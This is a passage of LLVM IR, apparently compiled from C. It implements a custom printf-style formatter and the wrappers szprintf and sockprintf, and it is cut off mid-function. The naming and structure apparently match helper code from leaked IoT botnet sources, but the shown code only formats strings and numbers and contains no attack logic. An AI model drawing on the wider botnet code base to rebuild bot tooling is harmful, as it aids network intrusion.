  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i64 0, i64 0
  %8 = call i32 @print(i8** noundef null, i8* noundef %6, %struct.__va_list_tag* noundef %7)
  ret i32 %8
}

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @print(i8** noundef %0, i8* noundef %1, %struct.__va_list_tag* noundef %2) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

12:                                               ; preds = %283, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %286

17:                                               ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %274

22:                                               ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

29:                                               ; preds = %22
  br label %286

30:                                               ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

35:                                               ; preds = %30
  br label %275

36:                                               ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

41:                                               ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

44:                                               ; preds = %41, %36
  br label %45

45:                                               ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

50:                                               ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45, !llvm.loop !14

55:                                               ; preds = %45
  br label %56

56:                                               ; preds = %77, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %66

61:                                               ; preds = %56
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 57
  br label %66

66:                                               ; preds = %61, %56
  %67 = phi i1 [ false, %56 ], [ %65, %61 ]
  br i1 %67, label %68, label %80

68:                                               ; preds = %66
  %69 = load i32, i32* %7, align 4
  %70 = mul nsw i32 %69, 10
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %5, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = sub nsw i32 %73, 48
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  br label %77

77:                                               ; preds = %68
  %78 = load i8*, i8** %5, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %5, align 8
  br label %56, !llvm.loop !15

80:                                               ; preds = %66
  %81 = load i8*, i8** %5, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 115
  br i1 %84, label %85, label %119

85:                                               ; preds = %80
  %86 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %87 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = icmp ule i32 %88, 40
  br i1 %89, label %90, label %96

90:                                               ; preds = %85
  %91 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 3
  %92 = load i8*, i8** %91, align 8
  %93 = getelementptr i8, i8* %92, i32 %88
  %94 = bitcast i8* %93 to i32*
  %95 = add i32 %88, 8
  store i32 %95, i32* %87, align 8
  br label %101

96:                                               ; preds = %85
  %97 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 2
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to i32*
  %100 = getelementptr i8, i8* %98, i32 8
  store i8* %100, i8** %97, align 8
  br label %101

101:                                              ; preds = %96, %90
  %102 = phi i32* [ %94, %90 ], [ %99, %96 ]
  %103 = load i32, i32* %102, align 4
  %104 = sext i32 %103 to i64
  %105 = inttoptr i64 %104 to i8*
  store i8* %105, i8** %11, align 8
  %106 = load i8**, i8*** %4, align 8
  %107 = load i8*, i8** %11, align 8
  %108 = icmp ne i8* %107, null
  br i1 %108, label %109, label %111

109:                                              ; preds = %101
  %110 = load i8*, i8** %11, align 8
  br label %112

111:                                              ; preds = %101
  br label %112

112:                                              ; preds = %111, %109
  %113 = phi i8* [ %110, %109 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.538, i64 0, i64 0), %111 ]
  %114 = load i32, i32* %7, align 4
  %115 = load i32, i32* %8, align 4
  %116 = call i32 @prints(i8** noundef %106, i8* noundef %113, i32 noundef %114, i32 noundef %115)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, %116
  store i32 %118, i32* %9, align 4
  br label %283

119:                                              ; preds = %80
  %120 = load i8*, i8** %5, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 100
  br i1 %123, label %124, label %149

124:                                              ; preds = %119
  %125 = load i8**, i8*** %4, align 8
  %126 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %127 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 0
  %128 = load i32, i32* %127, align 8
  %129 = icmp ule i32 %128, 40
  br i1 %129, label %130, label %136

130:                                              ; preds = %124
  %131 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 3
  %132 = load i8*, i8** %131, align 8
  %133 = getelementptr i8, i8* %132, i32 %128
  %134 = bitcast i8* %133 to i32*
  %135 = add i32 %128, 8
  store i32 %135, i32* %127, align 8
  br label %141

136:                                              ; preds = %124
  %137 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 2
  %138 = load i8*, i8** %137, align 8
  %139 = bitcast i8* %138 to i32*
  %140 = getelementptr i8, i8* %138, i32 8
  store i8* %140, i8** %137, align 8
  br label %141

141:                                              ; preds = %136, %130
  %142 = phi i32* [ %134, %130 ], [ %139, %136 ]
  %143 = load i32, i32* %142, align 4
  %144 = load i32, i32* %7, align 4
  %145 = load i32, i32* %8, align 4
  %146 = call i32 @printi(i8** noundef %125, i32 noundef %143, i32 noundef 10, i32 noundef 1, i32 noundef %144, i32 noundef %145, i32 noundef 97)
  %147 = load i32, i32* %9, align 4
  %148 = add nsw i32 %147, %146
  store i32 %148, i32* %9, align 4
  br label %283

149:                                              ; preds = %119
  %150 = load i8*, i8** %5, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 120
  br i1 %153, label %154, label %179

154:                                              ; preds = %149
  %155 = load i8**, i8*** %4, align 8
  %156 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %157 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = icmp ule i32 %158, 40
  br i1 %159, label %160, label %166

160:                                              ; preds = %154
  %161 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 3
  %162 = load i8*, i8** %161, align 8
  %163 = getelementptr i8, i8* %162, i32 %158
  %164 = bitcast i8* %163 to i32*
  %165 = add i32 %158, 8
  store i32 %165, i32* %157, align 8
  br label %171

166:                                              ; preds = %154
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 2
  %168 = load i8*, i8** %167, align 8
  %169 = bitcast i8* %168 to i32*
  %170 = getelementptr i8, i8* %168, i32 8
  store i8* %170, i8** %167, align 8
  br label %171

171:                                              ; preds = %166, %160
  %172 = phi i32* [ %164, %160 ], [ %169, %166 ]
  %173 = load i32, i32* %172, align 4
  %174 = load i32, i32* %7, align 4
  %175 = load i32, i32* %8, align 4
  %176 = call i32 @printi(i8** noundef %155, i32 noundef %173, i32 noundef 16, i32 noundef 0, i32 noundef %174, i32 noundef %175, i32 noundef 97)
  %177 = load i32, i32* %9, align 4
  %178 = add nsw i32 %177, %176
  store i32 %178, i32* %9, align 4
  br label %283

179:                                              ; preds = %149
  %180 = load i8*, i8** %5, align 8
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 88
  br i1 %183, label %184, label %209

184:                                              ; preds = %179
  %185 = load i8**, i8*** %4, align 8
  %186 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = icmp ule i32 %188, 40
  br i1 %189, label %190, label %196

190:                                              ; preds = %184
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 3
  %192 = load i8*, i8** %191, align 8
  %193 = getelementptr i8, i8* %192, i32 %188
  %194 = bitcast i8* %193 to i32*
  %195 = add i32 %188, 8
  store i32 %195, i32* %187, align 8
  br label %201

196:                                              ; preds = %184
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 2
  %198 = load i8*, i8** %197, align 8
  %199 = bitcast i8* %198 to i32*
  %200 = getelementptr i8, i8* %198, i32 8
  store i8* %200, i8** %197, align 8
  br label %201

201:                                              ; preds = %196, %190
  %202 = phi i32* [ %194, %190 ], [ %199, %196 ]
  %203 = load i32, i32* %202, align 4
  %204 = load i32, i32* %7, align 4
  %205 = load i32, i32* %8, align 4
  %206 = call i32 @printi(i8** noundef %185, i32 noundef %203, i32 noundef 16, i32 noundef 0, i32 noundef %204, i32 noundef %205, i32 noundef 65)
  %207 = load i32, i32* %9, align 4
  %208 = add nsw i32 %207, %206
  store i32 %208, i32* %9, align 4
  br label %283

209:                                              ; preds = %179
  %210 = load i8*, i8** %5, align 8
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 117
  br i1 %213, label %214, label %239

214:                                              ; preds = %209
  %215 = load i8**, i8*** %4, align 8
  %216 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %217 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 8
  %219 = icmp ule i32 %218, 40
  br i1 %219, label %220, label %226

220:                                              ; preds = %214
  %221 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 3
  %222 = load i8*, i8** %221, align 8
  %223 = getelementptr i8, i8* %222, i32 %218
  %224 = bitcast i8* %223 to i32*
  %225 = add i32 %218, 8
  store i32 %225, i32* %217, align 8
  br label %231

226:                                              ; preds = %214
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 2
  %228 = load i8*, i8** %227, align 8
  %229 = bitcast i8* %228 to i32*
  %230 = getelementptr i8, i8* %228, i32 8
  store i8* %230, i8** %227, align 8
  br label %231

231:                                              ; preds = %226, %220
  %232 = phi i32* [ %224, %220 ], [ %229, %226 ]
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %7, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @printi(i8** noundef %215, i32 noundef %233, i32 noundef 10, i32 noundef 0, i32 noundef %234, i32 noundef %235, i32 noundef 97)
  %237 = load i32, i32* %9, align 4
  %238 = add nsw i32 %237, %236
  store i32 %238, i32* %9, align 4
  br label %283

239:                                              ; preds = %209
  %240 = load i8*, i8** %5, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 99
  br i1 %243, label %244, label %273

244:                                              ; preds = %239
  %245 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %246 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = icmp ule i32 %247, 40
  br i1 %248, label %249, label %255

249:                                              ; preds = %244
  %250 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 3
  %251 = load i8*, i8** %250, align 8
  %252 = getelementptr i8, i8* %251, i32 %247
  %253 = bitcast i8* %252 to i32*
  %254 = add i32 %247, 8
  store i32 %254, i32* %246, align 8
  br label %260

255:                                              ; preds = %244
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 2
  %257 = load i8*, i8** %256, align 8
  %258 = bitcast i8* %257 to i32*
  %259 = getelementptr i8, i8* %257, i32 8
  store i8* %259, i8** %256, align 8
  br label %260

260:                                              ; preds = %255, %249
  %261 = phi i32* [ %253, %249 ], [ %258, %255 ]
  %262 = load i32, i32* %261, align 4
  %263 = trunc i32 %262 to i8
  %264 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %263, i8* %264, align 1
  %265 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %265, align 1
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  %268 = load i32, i32* %7, align 4
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @prints(i8** noundef %266, i8* noundef %267, i32 noundef %268, i32 noundef %269)
  %271 = load i32, i32* %9, align 4
  %272 = add nsw i32 %271, %270
  store i32 %272, i32* %9, align 4
  br label %283

273:                                              ; preds = %239
  br label %282

274:                                              ; preds = %17
  br label %275

275:                                              ; preds = %274, %35
  %276 = load i8**, i8*** %4, align 8
  %277 = load i8*, i8** %5, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  call void @printchar(i8** noundef %276, i32 noundef %279)
  %280 = load i32, i32* %9, align 4
  %281 = add nsw i32 %280, 1
  store i32 %281, i32* %9, align 4
  br label %282

282:                                              ; preds = %275, %273
  br label %283

283:                                              ; preds = %282, %260, %231, %201, %171, %141, %112
  %284 = load i8*, i8** %5, align 8
  %285 = getelementptr inbounds i8, i8* %284, i32 1
  store i8* %285, i8** %5, align 8
  br label %12, !llvm.loop !16

286:                                              ; preds = %29, %12
  %287 = load i8**, i8*** %4, align 8
  %288 = icmp ne i8** %287, null
  br i1 %288, label %289, label %292

289:                                              ; preds = %286
  %290 = load i8**, i8*** %4, align 8
  %291 = load i8*, i8** %290, align 8
  store i8 0, i8* %291, align 1
  br label %292

292:                                              ; preds = %289, %286
  %293 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %294 = bitcast %struct.__va_list_tag* %293 to i8*
  call void @llvm.va_end(i8* %294)
  %295 = load i32, i32* %9, align 4
  ret i32 %295
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @prints(i8** noundef %0, i8* noundef %1, i32 noundef %2, i32 noundef %3) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

15:                                               ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

17:                                               ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

21:                                               ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

24:                                               ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17, !llvm.loop !17

27:                                               ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

31:                                               ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

32:                                               ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

36:                                               ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

40:                                               ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

41:                                               ; preds = %40, %36
  br label %42

42:                                               ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %59, label %46

46:                                               ; preds = %42
  br label %47

47:                                               ; preds = %55, %46
  %48 = load i32, i32* %7, align 4
  %49 = icmp sgt i32 %48, 0
  br i1 %49, label %50, label %58

50:                                               ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = load i32, i32* %10, align 4
  call void @printchar(i8** noundef %51, i32 noundef %52)
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %9, align 4
  br label %55

55:                                               ; preds = %50
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %7, align 4
  br label %47, !llvm.loop !18

58:                                               ; preds = %47
  br label %59

59:                                               ; preds = %58, %42
  br label %60

60:                                               ; preds = %71, %59
  %61 = load i8*, i8** %6, align 8
  %62 = load i8, i8* %61, align 1
  %63 = icmp ne i8 %62, 0
  br i1 %63, label %64, label %74

64:                                               ; preds = %60
  %65 = load i8**, i8*** %5, align 8
  %66 = load i8*, i8** %6, align 8
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  call void @printchar(i8** noundef %65, i32 noundef %68)
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %9, align 4
  br label %71

71:                                               ; preds = %64
  %72 = load i8*, i8** %6, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %6, align 8
  br label %60, !llvm.loop !19

74:                                               ; preds = %60
  br label %75

75:                                               ; preds = %83, %74
  %76 = load i32, i32* %7, align 4
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %86

78:                                               ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %10, align 4
  call void @printchar(i8** noundef %79, i32 noundef %80)
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %9, align 4
  br label %83

83:                                               ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %7, align 4
  br label %75, !llvm.loop !20

86:                                               ; preds = %75
  %87 = load i32, i32* %9, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @printi(i8** noundef %0, i32 noundef %1, i32 noundef %2, i32 noundef %3, i32 noundef %4, i32 noundef %5, i32 noundef %6) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

25:                                               ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** noundef %28, i8* noundef %29, i32 noundef %30, i32 noundef %31)
  store i32 %32, i32* %8, align 4
  br label %102

33:                                               ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

36:                                               ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

39:                                               ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

42:                                               ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

45:                                               ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

50:                                               ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

53:                                               ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

59:                                               ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

65:                                               ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50, !llvm.loop !21

74:                                               ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

77:                                               ; preds = %74
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %90

80:                                               ; preds = %77
  %81 = load i32, i32* %14, align 4
  %82 = and i32 %81, 2
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %90

84:                                               ; preds = %80
  %85 = load i8**, i8*** %9, align 8
  call void @printchar(i8** noundef %85, i32 noundef 45)
  %86 = load i32, i32* %20, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %13, align 4
  br label %93

90:                                               ; preds = %80, %77
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 -1
  store i8* %92, i8** %17, align 8
  store i8 45, i8* %92, align 1
  br label %93

93:                                               ; preds = %90, %84
  br label %94

94:                                               ; preds = %93, %74
  %95 = load i32, i32* %20, align 4
  %96 = load i8**, i8*** %9, align 8
  %97 = load i8*, i8** %17, align 8
  %98 = load i32, i32* %13, align 4
  %99 = load i32, i32* %14, align 4
  %100 = call i32 @prints(i8** noundef %96, i8* noundef %97, i32 noundef %98, i32 noundef %99)
  %101 = add nsw i32 %95, %100
  store i32 %101, i32* %8, align 4
  br label %102

102:                                              ; preds = %94, %25
  %103 = load i32, i32* %8, align 4
  ret i32 %103
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @printchar(i8** noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

7:                                                ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

15:                                               ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 noundef 1, i8* noundef %16, i64 noundef 1)
  br label %18

18:                                               ; preds = %15, %7
  ret void
}

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32 noundef, i8* noundef, i64 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @szprintf(i8* noundef %0, i8* noundef %1, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i64 0, i64 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i64 0, i64 0
  %10 = call i32 @print(i8** noundef %3, i8* noundef %8, %struct.__va_list_tag* noundef %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @sockprintf(i32 noundef %0, i8* noundef %1, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 noundef 2048) #10
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %10, i8 0, i64 2048, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %16 = call i32 @print(i8** noundef %5, i8* noundef %14, %struct.__va_list_tag* noundef %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* noundef %20) #11
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.471, i64 0, i64 0), i8* noundef %23)
  %25 = load i32, i32* %3, align 4
